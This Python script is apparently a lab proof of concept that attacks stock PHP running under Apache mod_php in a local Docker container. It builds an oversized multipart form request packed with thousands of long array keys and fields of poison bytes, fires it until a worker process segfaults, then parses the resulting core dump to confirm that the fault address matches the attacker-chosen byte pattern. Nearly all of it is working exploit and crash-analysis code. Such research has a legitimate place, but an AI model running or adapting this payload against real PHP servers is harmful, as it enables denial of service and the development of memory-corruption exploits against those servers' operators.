#!/usr/bin/env python3
"""oom55: STOCK-module mod_php kill + core capture + siginfo forensics.
No instrument anywhere. Setup via docker cp only (exec flaky):
  lab ini + CoreDumpDirectory /tmp conf + envvars ulimit -c unlimited
  -> restart -> poll lab ini active -> fire attacks until child segv
  -> locate core (exec ls with retries) -> docker cp core -> parse ELF core
  notes: NT_PRSTATUS (rip/rdi/rsi) + NT_SIGINFO (si_addr).
VERDICT: si_addr == 0x0808080808080808 => poison-controlled fault address.
"""
import re
import struct
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
CONF = "/usr/local/etc/php/conf.d/30-oomlab.ini"
NAMELEN = 3064
LIB = "/usr/lib/apache2/modules/libphp.so"


def sh(cmd, timeout=20, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:150]
    except Exception as e:
        return type(e).__name__, str(e)[:150]


def logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=60)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def parse_core(path):
    """Extract NT_PRSTATUS registers + NT_SIGINFO si_addr from an ELF core."""
    NT_PRSTATUS, NT_SIGINFO, NT_FPREGSET = 1, 0x53494749, 2
    out = {}
    with open(path, "rb") as f:
        data = f.read()
    is64 = data[4] == 2
    if is64:
        e_phoff, = struct.unpack_from("<Q", data, 0x20)
        e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            p_type = struct.unpack_from("<I", data, off)[0]
            if p_type != 4:  # PT_NOTE
                continue
            n_off = struct.unpack_from("<Q", data, off + 0x20)[0]
            n_size = struct.unpack_from("<Q", data, off + 0x20 + 8)[0]
            pos = n_off
            end = n_off + n_size
            while pos + 12 <= end:
                namesz, descsz, ntype = struct.unpack_from("<III", data, pos)
                pos += 12
                name = data[pos:pos + namesz]
                pos += (namesz + 3) // 4 * 4
                desc_off = pos
                pos += (descsz + 3) // 4 * 4
                if ntype == NT_PRSTATUS and descsz >= 136:
                    # elf_prstatus: reg offset 112 in desc (x86_64)
                    regs = struct.unpack_from("<27Q", data, desc_off + 112)
                    names = ["r15", "r14", "r13", "r12", "rbp", "rbx", "r11", "r10",
                             "r9", "r8", "rax", "rcx", "rdx", "rsi", "rdi",
                             "orig_ax", "rip", "cs", "eflags", "rsp", "ss"]
                    out["regs"] = dict(zip(names, regs[:21]))
                    out["pid"], = struct.unpack_from("<i", data, desc_off + 32)
                elif ntype == NT_SIGINFO and descsz >= 128:
                    si_signo, si_errno, si_code = struct.unpack_from("<iii", data, desc_off)
                    si_addr, = struct.unpack_from("<Q", data, desc_off + 16)
                    out["siginfo"] = (si_signo, si_code, si_addr)
    return out


def main():
    t_start = time.time()
    print("=== setup ===", flush=True)
    with open("/tmp/phplab/oomlab.ini", "w") as f:
        f.write("memory_limit=20600000\nmax_input_vars=100000\npost_max_size=4096M\n")
    dcp("/tmp/phplab/oomlab.ini", "php_vuln:" + CONF)
    with open("/tmp/phplab/oomcore.conf", "w") as f:
        f.write("CoreDumpDirectory /tmp\n")
    dcp("/tmp/phplab/oomcore.conf", "php_vuln:/etc/apache2/conf-enabled/oomcore.conf")
    dcp("php_vuln:/etc/apache2/envvars", "/tmp/phplab/envvars")
    ev = open("/tmp/phplab/envvars").read()
    changed = False
    if "PHPRC" not in ev:
        ev += "\nexport PHPRC=/usr/local/etc/php/conf.d/30-oomlab.ini\n"
        changed = True
    if "ulimit -c" not in ev:
        ev += "\nulimit -c unlimited\n"
        changed = True
    if changed:
        open("/tmp/phplab/envvars", "w").write(ev)
        dcp("/tmp/phplab/envvars", "php_vuln:/etc/apache2/envvars")
    print("[lib]", sh("md5sum %s | cut -c1-8" % LIB), "(stock expected)", flush=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(20):
        time.sleep(1.5)
        c, probe = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT] lab ini not active", flush=True)
        return

    print("=== fire ===", flush=True)
    att = build_attack()
    base_segv = len(re.findall(r"exit signal Segmentation", logs()))
    print("[baseline] segv_total_before=%d" % base_segv, flush=True)
    crashed = False
    for i in range(6):
        code, text = http("/oom_mod.php", att,
                          "multipart/form-data; boundary=BOUND", 40)
        print("  atk%d: %s %r" % (i, code, text[:60]), flush=True)
        time.sleep(1)
        now = len(re.findall(r"exit signal Segmentation", logs()))
        print("    segv_total=%d (new=%d)" % (now, now - base_segv), flush=True)
        if now > base_segv:
            crashed = True
            break
    print("[fired] crashed_seen=%s" % crashed, flush=True)

    print("=== core hunt ===", flush=True)
    core_ls = ""
    for attempt in range(3):
        core_ls = sh("ls -la /tmp/core* 2>/dev/null", 15, retries=1)
        if "core" in core_ls and "EXEC" not in core_ls:
            break
        time.sleep(2)
    print(core_ls or "(no core listing)")
    m = re.search(r"(/tmp/core\S*)", core_ls)
    if not m:
        print("[NO CORE] pattern:", sh("cat /proc/sys/kernel/core_pattern", 10), flush=True)
        return
    corep = m.group(1)
    dcp("php_vuln:" + corep, "/tmp/phplab/child.core")
    info = parse_core("/tmp/phplab/child.core")
    print("[siginfo]", info.get("siginfo"))
    print("[pid]", info.get("pid"))
    regs = info.get("regs", {})
    for k in ("rip", "rdi", "rsi", "rax", "rsp", "rbp"):
        print("  %s=0x%x" % (k, regs.get(k, 0)))
    si = info.get("siginfo", (0, 0, 0))
    addr = si[2]
    print("[VERDICT] sig=%s si_addr=0x%x poison_pattern=%s" %
          (si[0], addr, (addr & 0xFFFFFFFF) == 0x08080808 or addr == 0x808080808080808),
          flush=True)


if __name__ == "__main__":
    main()
